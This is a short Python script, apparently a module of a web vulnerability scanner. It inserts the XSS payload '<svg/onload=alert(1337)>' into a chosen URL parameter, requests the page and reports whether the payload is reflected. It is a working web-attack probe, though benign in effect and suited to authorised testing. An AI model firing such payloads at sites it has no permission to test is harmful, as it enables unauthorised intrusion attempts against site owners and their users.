import requests
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

DEFAULT_PAYLOAD = '<svg/onload=alert(1337)>'

def build_url_with_param(base_url: str, param: str, value: str) -> str:
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    new_parsed = parsed._replace(query=new_query)
    return urlunparse(new_parsed)

def run(url: str, param: str):
    print(f"[+] Checking reflected XSS on: {url}")
    print(f"[*] Parameter: {param}")
    print(f"[*] Payload: {DEFAULT_PAYLOAD}")

    target_url = build_url_with_param(url, param, DEFAULT_PAYLOAD)
    print(f"[*] Final URL: {target_url}")

    try:
        resp = requests.get(target_url, timeout=10, verify=True)
    except Exception as e:
        print(f"[!] Request failed: {e}")
        return

    body = resp.text

    if DEFAULT_PAYLOAD in body:
        print("\n[!!!] Payload reflected in response body.")
        print("[+] Possible reflected XSS. Manual verification required.")
    else:
        print("\n[*] Payload not directly reflected in response body.")
        print("[*] No simple reflected XSS detected with this payload.")
